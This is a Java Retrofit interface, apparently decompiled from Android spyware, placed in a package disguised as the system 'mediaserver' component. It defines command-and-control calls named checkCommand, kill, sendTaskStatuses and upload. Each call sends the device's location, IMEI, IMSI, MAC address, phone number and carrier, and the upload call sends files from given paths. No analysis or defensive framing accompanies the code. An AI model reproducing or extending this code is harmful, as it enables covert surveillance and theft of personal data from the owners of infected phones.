package com.android.mediaserver.network;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.GET;
import retrofit2.http.Header;
import retrofit2.http.Headers;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;

public interface HomeCommunicationService {
  @Headers({ "T: A" }) @GET("/command") Call<ResponseBody> checkCommand(
      @Header("Version") String str, @Header("IID") String str2, @Header("CID") String str3,
      @Header("UUID") String str4, @Header("Location") String str5,
      @Header("IsConnectedToWifi") boolean z, @Header("IsRoaming") boolean z2,
      @Header("MAC") String str6, @Header("IMSI") String str7, @Header("IMEI") String str8,
      @Header("Carrier") String str9, @Header("PhoneNumber") String str10,
      @Header("Manufacturer") String str11, @Header("Model") String str12,
      @Header("OSVersion") String str13);

  @POST("/status") @Headers({ "T: A" }) Call<ResponseBody> kill(@Header("Version") String str,
      @Header("IID") String str2, @Header("CID") String str3, @Header("UUID") String str4,
      @Header("Location") String str5, @Header("MAC") String str6, @Header("IMSI") String str7,
      @Header("IMEI") String str8, @Header("Carrier") String str9,
      @Header("PhoneNumber") String str10, @Header("Manufacturer") String str11,
      @Header("Model") String str12, @Header("OSVersion") String str13,
      @Body RequestBody requestBody);

  @POST("/status") @Headers({ "T: A" }) Call<ResponseBody> sendTaskStatuses(
      @Header("Version") String str, @Header("IID") String str2, @Header("CID") String str3,
      @Header("UUID") String str4, @Header("Location") String str5, @Header("MAC") String str6,
      @Header("IMSI") String str7, @Header("IMEI") String str8, @Header("Carrier") String str9,
      @Header("PhoneNumber") String str10, @Header("Manufacturer") String str11,
      @Header("Model") String str12, @Header("OSVersion") String str13,
      @Body RequestBody requestBody);

  @POST("/upload") @Multipart @Headers({ "T: A" }) Call<ResponseBody> upload(
      @Part MultipartBody.Part part, @Part("description") RequestBody requestBody,
      @Header("Version") String str, @Header("IID") String str2, @Header("CID") String str3,
      @Header("UUID") String str4, @Header("Type") String str5, @Header("Subtype") String str6,
      @Header("HD") String str7, @Header("Location") String str8, @Header("Path") String str9,
      @Header("IsConnectedToWifi") boolean z, @Header("IsRoaming") boolean z2,
      @Header("MAC") String str10, @Header("IMSI") String str11, @Header("IMEI") String str12,
      @Header("Carrier") String str13, @Header("PhoneNumber") String str14,
      @Header("Manufacturer") String str15, @Header("Model") String str16,
      @Header("OSVersion") String str17);
}
